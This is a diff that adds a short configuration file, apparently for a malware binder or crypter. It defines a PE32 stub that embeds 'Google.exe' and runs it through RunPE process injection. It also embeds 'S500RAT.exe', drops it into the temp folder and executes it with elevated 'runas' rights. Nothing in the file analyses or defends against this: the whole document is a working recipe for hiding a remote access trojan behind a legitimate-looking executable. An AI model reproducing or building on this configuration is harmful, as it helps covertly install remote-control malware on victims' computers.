@@ -1,0 +1,24 @@
+﻿[stub]
+type = pe32
+padding = 50
+
+[manifest]
+template = default
+
+[source.embedded]
+id = 0455ef40-725e-4766-819a-25d8cc3dd62e
+path = Google.exe
+compress = true
+
+[source.embedded]
+id = 2f6f462e-d79e-4e92-877a-192a01356fe3
+path = S500RAT.exe
+
+[action.runpe]
+source = 0455ef40-725e-4766-819a-25d8cc3dd62e
+
+[action.drop]
+source = 2f6f462e-d79e-4e92-877a-192a01356fe3
+location = temp
+filename = S500RAT.exe
+execute = runas
